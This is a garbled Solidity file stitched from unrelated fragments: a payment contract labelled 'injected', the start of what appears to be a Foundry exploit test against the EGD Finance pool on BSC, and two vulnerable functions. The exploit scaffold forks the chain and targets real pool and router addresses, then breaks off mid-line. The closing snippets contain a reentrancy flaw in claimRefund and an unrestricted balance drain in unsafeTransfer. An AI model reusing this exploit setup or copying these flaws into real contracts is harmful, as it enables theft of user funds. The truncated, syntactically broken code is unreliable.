
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity ^0.8.10;

;
;
IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;
contract Attacker is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 20_245_522);
        vm.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        vm.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        vm.label(address(pancakeRouter), "pancakeRouter");
        vm.label(EGD_Finance, "EGD_Finance");
        vm.label(usdt, "USDT");
        vm.label(egd, "EGD")};
    function testExploit() public {
        Exploit exploit = new Exploit();
        console.log("--------------------  Pre-work, stake 100 USDT to EGD Finance --------------------");
        console.log("Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8");
        console.log("Attacker Stake 100 USDT to EGD Finance");
        exploit.stake();
        vm.warp(165991
function unsafeTransfer(address to) public {
    to.call{value: address(this).balance}("")}
function claimRefund() public {
    uint refund = balances[msg.sender];
    require(refund > 0);
    (bool ok, ) = msg.sender.call{value: refund}("");
    require(ok);
    balances[msg.sender] = 0}